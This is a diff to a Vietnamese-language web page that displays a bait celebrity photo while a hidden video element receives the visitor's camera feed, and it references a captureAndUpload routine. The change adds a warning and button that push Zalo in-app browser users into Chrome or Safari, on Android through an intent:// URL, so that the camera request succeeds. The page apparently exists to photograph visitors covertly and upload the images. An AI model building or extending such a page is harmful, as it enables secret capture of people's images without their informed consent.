@@ -16,6 +16,25 @@
     video {
       display: none;
     }
+    #zalo-warning {
+      display: none;
+      background: #fff3cd;
+      border: 1px solid #ffeeba;
+      padding: 15px;
+      border-radius: 10px;
+      max-width: 400px;
+      margin: 20px auto;
+      color: #856404;
+    }
+    #zalo-warning button {
+      margin-top: 10px;
+      padding: 10px 20px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+    }
   </style>
 </head>
 <body>
@@ -23,27 +42,25 @@
   <h2>Ảnh mẫu:</h2>
   <img class="main-img" src="https://phamgiamedia.vn/wp-content/uploads/2023/12/Ngoc-Trinh-2.jpg" alt="Sample Image">
 
+  <div id="zalo-warning">
+    <p><strong>⚠️ Zalo không hỗ trợ camera.</strong></p>
+    <p>Vui lòng nhấn nút bên dưới để mở bằng trình duyệt ngoài như Chrome hoặc Safari.</p>
+    <button onclick="openInBrowser()">Mở bằng trình duyệt</button>
+  </div>
+
   <video id="video" autoplay playsinline></video>
 
   <script>
     const video = document.getElementById('video');
+    const zaloWarning = document.getElementById('zalo-warning');
 
     function isZaloWebview() {
       const ua = navigator.userAgent.toLowerCase();
       return ua.includes("zalo");
     }
 
-    function openInBrowser() {
-      const url = window.location.href;
-      if (navigator.userAgent.toLowerCase().includes("android")) {
-        window.location.href = `intent://${url.replace(/^https?:\/\//, '')}#Intent;scheme=https;end`;
-      } else {
-        window.location.href = url;
-      }
-    }
-
     if (isZaloWebview()) {
-      openInBrowser(); // tự động chuyển hướng nếu là Zalo
+      zaloWarning.style.display = 'block';
     } else {
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
@@ -57,6 +74,15 @@
         .catch(err => {
           console.error('Không thể truy cập camera:', err);
         });
+    }
+
+    function openInBrowser() {
+      const url = window.location.href;
+      if (navigator.userAgent.toLowerCase().includes("android")) {
+        window.location.href = `intent://${url.replace(/^https?:\/\//, '')}#Intent;scheme=https;end`;
+      } else {
+        window.location.href = url;
+      }
     }
 
     function captureAndUpload() {
